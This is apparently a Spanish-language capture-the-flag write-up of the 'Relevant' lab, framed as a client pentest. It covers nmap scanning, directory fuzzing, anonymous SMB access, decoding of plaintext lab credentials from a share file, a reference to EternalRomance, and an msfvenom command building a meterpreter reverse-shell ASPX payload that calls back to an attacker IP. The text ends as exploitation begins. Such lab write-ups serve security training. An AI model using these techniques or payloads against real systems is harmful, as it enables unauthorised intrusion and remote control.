# Relevant

# Introducción

Un cliente nos ha contratado y quiere que hagamos un test de penetración.

EL ciente solicita que el ingeniero haga una evaluación de enotrno. 

- User.txt
- Root.txt

Adicionalmente:

- Herramientas y tecnicas utilizadas
- Vulnerabilidades encontradas
- Flags que hemos encontrado
- Solo IP que tenemos asiganda
- Busca y reporta todas las vulnerabilidades

# Enumeración

```
sudo nmap -sCV -T4 --min-rate 4000 10.10.12.208

Starting Nmap 7.60 ( https://nmap.org ) at 2024-11-11 15:40 GMT
Nmap scan report for ip-10-10-12-208.eu-west-1.compute.internal (10.10.12.208)
Host is up (0.00024s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2024-11-10T15:38:06
|_Not valid after:  2025-05-12T15:38:06
|_ssl-date: 2024-11-11T15:40:29+00:00; 0s from scanner time.
MAC Address: 02:2D:9C:6E:47:D1 (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: RELEVANT, NetBIOS user: <unknown>, NetBIOS MAC: 02:2d:9c:6e:47:d1 (unknown)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-11-11T07:40:29-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-11-11 15:40:29
|_  start_date: 2024-11-11 15:38:25

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.48 seconds
```

Primero de todo enumeramos la web (80) 

![image](https://github.com/user-attachments/assets/2a10e83a-90e4-4921-a5ba-d82f68d765cb)

Vemos que es una ISS sin ningún tipo de configuración vamos a enumera subdominios a ver si encontramos algo.

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.10.12.208/FUZZ
```

SPOILER: No encontramos nada, vamos a buscar otro vector.

Vemos también el puerto smb abierto, pudiendo enumerar SMB

```
smbclient -L //10.10.12.208
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
Connection to 10.10.12.208 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
```

Vaya vaya "nt4wrksv" vamos a ver si tenemos acceso

```
smbclient  //10.10.12.208/nt4wrksv
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 22:46:04 2020
  ..                                  D        0  Sat Jul 25 22:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 16:15:33 2020

		7735807 blocks of size 4096. 5135178 blocks available
```

Hacemos un Get y nos lo llevamos

```
cat passwords.txt 
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

Parece ser que nos encontramos dos hashes en base64 vamos a intentar hacer una base64 -d

```
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

Vaya vaya tenemos ya dos usuarios, SPOILER: No son ni para Xfreerdp ni para SSH, vamos a seguir enumerando a ver si encontramos lugar para meter credenciales o vulnerabilidades en servicios.

Después de estar buscando y enumerando encontramos la vulnerabilidad tan famosa "EternalRomance"

https://www.exploit-db.com/exploits/43970

# Explotación

Primero de todo generaremos un rev shell con msfvenom 

```
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.10.30.244 lport=9001 -f aspx -o reverse_shell.aspx
```



